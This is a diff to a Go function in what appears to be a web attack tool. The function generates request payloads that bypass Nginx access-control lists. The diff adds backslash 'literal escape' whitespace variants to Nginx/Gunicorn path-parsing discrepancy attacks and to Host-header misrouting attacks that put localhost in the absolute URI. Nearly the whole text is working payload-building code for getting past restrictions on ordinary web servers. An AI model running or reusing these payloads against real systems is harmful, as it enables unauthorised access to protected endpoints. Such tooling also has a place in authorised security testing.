@@ -789,16 +789,17 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 	// NEW TECHNIQUE: Nginx+Gunicorn whitespace parsing discrepancy exploit
 	// Whitespace in path causes Gunicorn to stop parsing at the whitespace
 	whitespaceVariants := []struct {
-		raw    string // Raw character
-		urlEnc string // URL-encoded version
-		hexEsc string // Hex escape sequence
-		desc   string // Description for logging
+		raw        string // Raw character
+		urlEnc     string // URL-encoded version
+		hexEsc     string // Hex escape sequence
+		literalEsc string // Literal escape sequence (backslash + character)
+		desc       string // Description for logging
 	}{
-		{"\t", "%09", "\\x09", "tab"},                       // Tab
-		{" ", "%20", "\\x20", "space"},                      // Space
-		{"\u00A0", "%C2%A0", "\\xA0", "non-breaking-space"}, // Non-breaking space
-		{"\v", "%0B", "\\x0B", "vertical-tab"},              // Vertical tab
-		{"\f", "%0C", "\\x0C", "form-feed"},                 // Form feed
+		{"\t", "%09", "\\x09", "\\t", "tab"},                           // Tab
+		{" ", "%20", "\\x20", " ", "space"},                            // Space (no literal escape for space)
+		{"\u00A0", "%C2%A0", "\\xA0", "\\u00A0", "non-breaking-space"}, // Non-breaking space
+		{"\v", "%0B", "\\x0B", "\\v", "vertical-tab"},                  // Vertical tab
+		{"\f", "%0C", "\\x0C", "\\f", "form-feed"},                     // Form feed
 	}
 
 	// HTTP version-like strings that Gunicorn might misinterpret
@@ -830,6 +831,14 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 			job.PayloadToken = GeneratePayloadToken(job)
 			allJobs = append(allJobs, job)
 
+			// 4. NEW: Literal escape sequence
+			if whitespace.literalEsc != " " { // Skip space as it has no literal escape
+				job = baseJob
+				job.RawURI = basePath + whitespace.literalEsc + httpVersion + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+			}
+
 			// Try at different positions in complex paths
 			if strings.Count(basePath, "/") > 1 {
 				segments := strings.Split(strings.TrimPrefix(basePath, "/"), "/")
@@ -858,6 +867,14 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 					job.RawURI = prefix + whitespace.hexEsc + httpVersion + suffix + query
 					job.PayloadToken = GeneratePayloadToken(job)
 					allJobs = append(allJobs, job)
+
+					// NEW: Literal escape sequence at path segment
+					if whitespace.literalEsc != " " { // Skip space as it has no literal escape
+						job = baseJob
+						job.RawURI = prefix + whitespace.literalEsc + httpVersion + suffix + query
+						job.PayloadToken = GeneratePayloadToken(job)
+						allJobs = append(allJobs, job)
+					}
 				}
 			}
 		}
@@ -871,7 +888,6 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 		"http://",
 		"https://",
 		"gopher://", // parser behavior
-		"data:",     // Protocol handlers that might bypass restrictions
 		"file://",
 	}
 
@@ -899,8 +915,6 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 		allJobs = append(allJobs, job)
 
 		// NEW TECHNIQUE: Host misrouting using localhost instead of original host
-		// This exploits the behavior seen in the diagram where Nginx routes to localhost
-		// while HAProxy still sees the target.com Host header
 		for _, altHost := range alternativeHosts {
 			job := baseJob
 			absoluteURI := scheme + altHost + basePath
@@ -909,7 +923,6 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 			allJobs = append(allJobs, job)
 
 			// Also try keeping the Host header explicitly set to original host
-			// This is exactly the scenario in the image: localhost in URI, target.com in Host header
 			jobWithHostHeader := baseJob
 			jobWithHostHeader.RawURI = absoluteURI + query
 			jobWithHostHeader.Headers = append(jobWithHostHeader.Headers, Headers{
@@ -934,7 +947,7 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 		}
 	}
 
-	// 2. Combine Absolute-URI with whitespace technique for most powerful bypass
+	// 2. Combine Absolute-URI with whitespace technique
 	for _, whitespace := range whitespaceVariants {
 		for _, scheme := range schemes {
 			// A. Whitespace + Absolute-URI with original host
@@ -943,18 +956,35 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 			job.PayloadToken = GeneratePayloadToken(job)
 			allJobs = append(allJobs, job)
 
+			// NEW: Literal escape + Absolute-URI with original host
+			if whitespace.literalEsc != " " { // Skip space as it has no literal escape
+				job = baseJob
+				job.RawURI = basePath + whitespace.literalEsc + scheme + parsedURL.Host + basePath + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+			}
+
 			// Whitespace + Absolute-URI with localhost (primary misrouting attack vector)
 			for _, altHost := range alternativeHosts {
+				// Raw whitespace
 				job := baseJob
 				job.RawURI = basePath + whitespace.raw + scheme + altHost + basePath + query
 				job.PayloadToken = GeneratePayloadToken(job)
 				allJobs = append(allJobs, job)
 
-				// URL-encoded whitespace version
+				// URL-encoded whitespace
 				job = baseJob
 				job.RawURI = basePath + whitespace.urlEnc + scheme + altHost + basePath + query
 				job.PayloadToken = GeneratePayloadToken(job)
 				allJobs = append(allJobs, job)
+
+				// NEW: Literal escape whitespace
+				if whitespace.literalEsc != " " { // Skip space as it has no literal escape
+					job = baseJob
+					job.RawURI = basePath + whitespace.literalEsc + scheme + altHost + basePath + query
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+				}
 
 				// With explicit Host header (exactly like in the diagram)
 				job = baseJob
@@ -965,6 +995,18 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 				})
 				job.PayloadToken = GeneratePayloadToken(job)
 				allJobs = append(allJobs, job)
+
+				// NEW: With explicit Host header using literal escape
+				if whitespace.literalEsc != " " { // Skip space as it has no literal escape
+					job = baseJob
+					job.RawURI = basePath + whitespace.literalEsc + scheme + altHost + basePath + query
+					job.Headers = append(job.Headers, Headers{
+						Header: "Host",
+						Value:  parsedURL.Host,
+					})
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+				}
 			}
 
 			// URL-encoded whitespace version (original host)
@@ -975,11 +1017,19 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 
 			// B. Whitespace + HTTP + whitespace + Absolute-URI (complex case)
 			for _, httpVersion := range httpVersions {
-				// Original host
+				// Original host with raw whitespace
 				job := baseJob
 				job.RawURI = basePath + whitespace.raw + httpVersion + whitespace.raw + scheme + parsedURL.Host + basePath + query
 				job.PayloadToken = GeneratePayloadToken(job)
 				allJobs = append(allJobs, job)
+
+				// NEW: Original host with literal escape
+				if whitespace.literalEsc != " " { // Skip space as it has no literal escape
+					job = baseJob
+					job.RawURI = basePath + whitespace.literalEsc + httpVersion + whitespace.literalEsc + scheme + parsedURL.Host + basePath + query
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+				}
 
 				// Localhost variants with HTTP version for complex cases
 				for _, altHost := range alternativeHosts {
@@ -989,7 +1039,15 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 					job.PayloadToken = GeneratePayloadToken(job)
 					allJobs = append(allJobs, job)
 
-					// With explicit Host header
+					// NEW: Literal escape version
+					if whitespace.literalEsc != " " { // Skip space as it has no literal escape
+						job = baseJob
+						job.RawURI = basePath + whitespace.literalEsc + httpVersion + whitespace.literalEsc + scheme + altHost + basePath + query
+						job.PayloadToken = GeneratePayloadToken(job)
+						allJobs = append(allJobs, job)
+					}
+
+					// With explicit Host header using raw whitespace
 					job = baseJob
 					job.RawURI = basePath + whitespace.raw + httpVersion + whitespace.raw + scheme + altHost + basePath + query
 					job.Headers = append(job.Headers, Headers{
@@ -998,6 +1056,18 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 					})
 					job.PayloadToken = GeneratePayloadToken(job)
 					allJobs = append(allJobs, job)
+
+					// NEW: With explicit Host header using literal escape
+					if whitespace.literalEsc != " " { // Skip space as it has no literal escape
+						job = baseJob
+						job.RawURI = basePath + whitespace.literalEsc + httpVersion + whitespace.literalEsc + scheme + altHost + basePath + query
+						job.Headers = append(job.Headers, Headers{
+							Header: "Host",
+							Value:  parsedURL.Host,
+						})
+						job.PayloadToken = GeneratePayloadToken(job)
+						allJobs = append(allJobs, job)
+					}
 				}
 
 				// URL-encoded version (original host)
